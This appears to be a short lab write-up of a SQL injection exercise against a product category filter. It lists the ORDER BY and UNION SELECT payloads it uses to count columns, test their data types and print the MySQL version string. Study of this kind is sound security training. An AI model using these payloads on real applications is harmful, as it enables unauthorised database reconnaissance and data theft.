SQL Injection Attack: Query the database type and version on MYSQL and Microsoft
SLQ Injection Location: Product category filter

End Goal: Display database version string

--------------
ANALYSIS
--------------

As usual, you can quickly confirm the vulnerability using the SQLi character '

1. Find the number of columns that the vulnerable query is using

' order by 1--
' order by 2--
' order by 3--

You can also test with a different comment character since different SQL interpreters comments out differently

' order by 1#   :: Response code 200 => Colum exists
' order by 2#   :: Response code 200 => Colum exists
' order by 3#   :: Internal Server Error => Colum doesn't exist

There are 2 columns that the query is using

2. Determine the data types of the above columns

' UNION select 'a', NULL#   :: Column accepts text/string
' UNION select NULL, "a"#   :: Column accepts text/string
' UNION select 'a', 'a'#    :: Both accepts text/string

3. Output the database version

From the cheatsheet, to output database vesrion for MYSQL & Microsoft (MSSQL):

Microsoft:  SELECT @@version 
MYSQL:      SELECT @@version

Formulating the query:

' UNION select @@version, NULL#

We get:

8.0.25
